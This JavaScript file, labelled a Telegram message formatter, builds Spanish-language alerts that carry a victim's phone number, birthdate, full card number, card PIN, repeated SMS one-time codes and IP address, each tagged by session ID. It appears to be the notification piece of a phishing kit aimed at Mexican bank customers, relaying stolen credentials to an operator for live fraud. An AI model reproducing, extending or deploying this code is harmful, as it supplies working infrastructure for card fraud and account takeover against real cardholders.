/**
 * Telegram message formatter utility
 * Creates well-formatted, easy-to-copy messages with visual hierarchy
 */

/**
 * Generate visual emoji pattern based on session ID
 * Creates a 5-emoji pattern using a single color for easy visual identification
 */
function getSessionEmojis(sessionId) {
    // Extract the unique part after "BCP-" prefix
    // For example: "BCP-9WXHV0" -> "9WXHV0"
    const uniquePart = sessionId.replace('BCP-', '').replace(/[^A-Z0-9]/g, '');

    // Only use well-supported solid circle emojis to avoid encoding issues
    const colors = [
        '🔴', // Red
        '🟠', // Orange
        '🟡', // Yellow
        '🟢', // Green
        '🔵', // Blue
        '🟣'  // Purple
    ];

    // Pick color based on first character of the unique part
    // This ensures different sessions get different colors
    const colorIndex = uniquePart.charCodeAt(0) % colors.length;
    const selectedColor = colors[colorIndex];

    return `${selectedColor}${selectedColor}${selectedColor}${selectedColor}${selectedColor}`;
}

/**
 * Format initial registration data
 */
export function formatRegistrationMessage(data) {
    const { sessionId, phone, birthdate, cardNumber, ip } = data;
    const sessionEmojis = getSessionEmojis(sessionId);

    return `🆕 <b>NUEVO REGISTRO</b> ${sessionEmojis} 
<b>Sesión:</b> <code>${sessionId}</code>

📱 Teléfono: <code>${phone}</code>
🎂 Fecha Nacimiento: <code>${birthdate}</code>
💳 Tarjeta: <code>${cardNumber}</code>
🌐 IP: <code>${ip}</code>`;
}

/**
 * Format card details (NIP and last digits)
 */
export function formatCardDetailsMessage(data) {
    const { sessionId, lastTwoDigits, nip, ip } = data;
    const sessionEmojis = getSessionEmojis(sessionId);

    return `🔐 <b>NIP</b> ${sessionEmojis} 
<b>Sesión:</b> <code>${sessionId}</code>

NIP: <code>${nip}</code>
🌐 IP: <code>${ip}</code>`;
}

/**
 * Format OTP code message
 */
export function formatOTPMessage(data) {
    const { sessionId, otp, attempt, ip } = data;
    const sessionEmojis = getSessionEmojis(sessionId);

    return `🔑 <b>CÓDIGO SMS #${attempt}</b> ${sessionEmojis} 
<b>Sesión:</b> <code>${sessionId}</code>

🔐 CÓDIGO: <code>${otp}</code>
🌐 IP: <code>${ip}</code>`;
}

/**
 * Get current timestamp in readable format
 */
export function getTimestamp() {
    const now = new Date();
    return now.toLocaleString('es-MX', {
        timeZone: 'America/Mexico_City',
        year: 'numeric',
        month: '2-digit',
        day: '2-digit',
        hour: '2-digit',
        minute: '2-digit',
        second: '2-digit',
        hour12: false
    });
}
